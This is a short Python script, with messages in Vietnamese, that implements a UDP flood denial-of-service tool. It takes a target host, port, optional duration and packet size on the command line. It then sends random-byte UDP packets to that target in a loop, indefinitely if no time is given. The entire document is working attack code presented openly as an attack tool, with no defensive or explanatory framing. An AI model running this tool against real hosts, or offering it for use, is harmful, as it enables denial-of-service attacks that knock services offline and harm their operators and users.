import sys
import os
import socket
import time
import argparse


def udp_flood(ip, port, time_in_seconds, size):
    flag = 0
    bytes = os.urandom(min(65535, size))
    if time_in_seconds is None:
        flag = 1
        time_in_seconds = 0
    soc = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    timeout = time.time()+time_in_seconds
    while True:
        if flag == 1:
            soc.sendto(bytes, (ip, port))
        if time.time() > timeout and flag == 0:
            print("Da het thoi gian")
            sys.exit()
        else:
            soc.sendto(bytes, (ip, port))


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-H", "--host", help="Ten host can can tan cong", type=str, required=True)
    parser.add_argument(
        "-P", "--port", help="Cong can tan cong", type=int, required=True)
    parser.add_argument(
        "-T", "--time", help="Thoi gian can tan cong", type=int)
    parser.add_argument(
        "-S", "--size", help="Kich thuoc goi tin", type=int, required=True)
    args = parser.parse_args()
    host = args.host
    port = args.port
    time_in_seconds = args.time
    size = args.size
    try:
        print("Bat dau tan cong")
        udp_flood(host, port, time_in_seconds, size)
    except KeyboardInterrupt:
        print("\nDung tan cong")


if __name__ == "__main__":
    main()
